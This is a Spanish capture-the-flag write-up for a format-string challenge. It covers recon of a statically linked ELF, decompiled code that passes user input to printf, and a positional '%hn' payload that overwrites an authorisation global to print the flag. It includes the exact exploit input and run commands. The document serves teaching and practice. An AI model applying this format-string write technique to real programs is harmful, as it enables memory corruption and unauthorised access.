# Desafío 13 — Libro de Visitas

| Campo | Valor |
|---|---|
| Categoría | pwn / format string (escritura arbitraria) |
| Dificultad | media |
| Puntos | — |
| Estado | ✅ resuelto |
| Flag | `flag{ejemplo}` |
| Servicio | `nc <host> 11071` |

## Enunciado

> **Libro de Visitas** — El libro permaneció abierto mucho después de que se cerraran las puertas […]
> La administración insiste en que los registros son inalterables. Sin embargo, una revisión reciente
> encontró una inconsistencia: ciertas anotaciones parecen tener **más autoridad de la que deberían**.
> El sistema continúa aceptando visitantes. Deja tu registro, examina el comportamiento del sistema y
> descubre qué se oculta detrás de las autorizaciones.
>
> Archivo adjunto: `libro_visitas`

## Reconocimiento

```
libro_visitas: ELF 64-bit LSB executable, x86-64, statically linked, stripped
SHA256 e1c77c33e2753512a567ff69d25b1945ae0862818a2e79ae7e7d0d284704c587
```

`checksec`:

| RELRO | Canary | NX | PIE | FORTIFY |
|---|---|---|---|---|
| Partial | **No** | Sí | **No** | No |

`strings` relevantes:

```
Casillero de aprobacion: %p
Casillero destino (hex):
Nota:
/tmp/flag
Nota guardada sin aprobacion.
flag{ejemplo}      <- señuelo embebido en el binario
```

El binario no tiene menú: pide un **casillero destino (hex)**, luego una **nota**, imprime el puntero
del "casillero de aprobación" (variable global en `.bss`, `0x4a6a90`) y guarda la nota.

## Análisis

`main` (0x401924–0x401a9b) descompilado:

```c
int aprobacion = 0;                                  // .bss @ 0x4a6a90
printf("Casillero de aprobacion: %p\n", &aprobacion);
fgets(buf, 0x100, stdin);
unsigned long dest = strtoul(buf, NULL, 16);         // "casillero destino"
fgets(nota, 0x100, stdin);
printf(nota, dest, dest + 2);                        // <-- FORMAT STRING
if (aprobacion == 0x1337c0de) {                      // cmp dword [0x4a6a90], 0x1337c0de
    FILE *f = fopen("/tmp/flag", "r");
    fgets(buf, 0x80, f); puts(buf);
} else {
    puts("Nota guardada sin aprobacion.");
}
```

Puntos clave:

- La nota del visitante se usa como **format string** (`printf(nota, ...)`), no como `%s`.
- Los dos argumentos variádicos que pasa son `dest` (en `rsi`) y `dest + 2` (en `rdx`): dos punteros
  consecutivos separados por 2 bytes, justo lo necesario para dos escrituras `%hn` (mitad baja y alta).
- La "autorización" es un `int` global comparado con `0x1337c0de`; si coincide, se imprime `/tmp/flag`.
- Sin PIE: la dirección del global es fija (`0x4a6a90`), pero además el programa la **filtra** con `%p`,
  así que el exploit la parsea en tiempo de ejecución.

### Construcción del payload

Objetivo: escribir `0x1337c0de` en `0x4a6a90`.

| Mitad | Dirección | Valor | Caracteres a imprimir |
|---|---|---|---|
| baja | `0x4a6a90` (arg 1) | `0xc0de` (49374) | 49374 |
| alta | `0x4a6a92` (arg 2) | `0x1337` (4919) | acumulado ≡ 4919 (mod 65536) → +21081 |

Como cualquier conversión con ancho consume un argumento y desplazaría los punteros, se usan
**especificadores posicionales**:

```
%2$49374c%1$hn%2$21081c%2$hn
```

1. `%2$49374c` → imprime 49374 caracteres (consume arg 2, sin alterar los punteros).
2. `%1$hn` → escribe `49374 & 0xffff = 0xc0de` en `0x4a6a90`.
3. `%2$21081c` → acumula hasta 70455 caracteres.
4. `%2$hn` → escribe `70455 & 0xffff = 0x1337` en `0x4a6a92`.

Resultado en memoria: `0x1337c0de`.

Entrada completa (dos líneas):

```
4a6a90
%2$49374c%1$hn%2$21081c%2$hn
```

## Solución (pasos reproducibles)

```bash
# Prueba local (con /tmp/flag de prueba)
printf 'flag{ejemplo}\n' > /tmp/flag
./libro_visitas < work/payload_local.txt
# -> imprime la flag local

# Remoto
python solucion/exploit_libro.py <host> 11071
```

`exploit_libro.py` conecta, lee el leak (`Casillero de aprobacion: 0x...`), calcula los anchos a partir
de las mitades de `0x1337c0de`, envía el destino y el format string, y extrae la flag de la salida
(~70 KB por el padding de `%c`).

Salida relevante del servidor:

```
Casillero de aprobacion: 0x4a6a90
Casillero destino (hex):
Nota: ...
flag{ejemplo}
```

## Flag

```
flag{ejemplo}
```

## Evidencia y artefactos

| Ruta | Contenido |
|---|---|
| `libro_visitas` | Binario entregado (686.168 B) |
| `solucion/exploit_libro.py` | Exploit remoto (parsea leak, format string, extrae flag) |
| `work/payload_local.txt` | Entrada de prueba local (destino + format string) |
| `work/salida_local.txt` | Salida de la prueba local (flag de prueba) |
| `flag.txt` | Flag del reto |

## Lecciones / notas

- **Format string con argumentos controlados**: aquí no hacía falta apilar la dirección en el buffer;
  el programa ya pasaba dos punteros útiles (`dest`, `dest+2`), lo que permite `%hn`/`%hn` directo.
- **Especificadores posicionales** (`%n$`) permiten elegir qué argumento consume cada conversión y evitar
  que el relleno (`%<width>c`) desplace los punteros.
- **Dos `%hn`** evitan imprimir ~322 millones de caracteres para un `%n` de 32 bits.
- El señuelo `flag{ejemplo}` está en `.rodata`; la flag real se lee en caliente de
  `/tmp/flag` solo cuando la comparación cuadra.
- Sin canary ni PIE, pero NX activo: el camino es escritura arbitraria de datos, no shellcode.

## Backups

| Archivo | Backup |
|---|---|
| `ctf/CONTEXTO_CTF.md` (índice) | `ctf/backups/CONTEXTO_CTF.md.20261023-183429` |
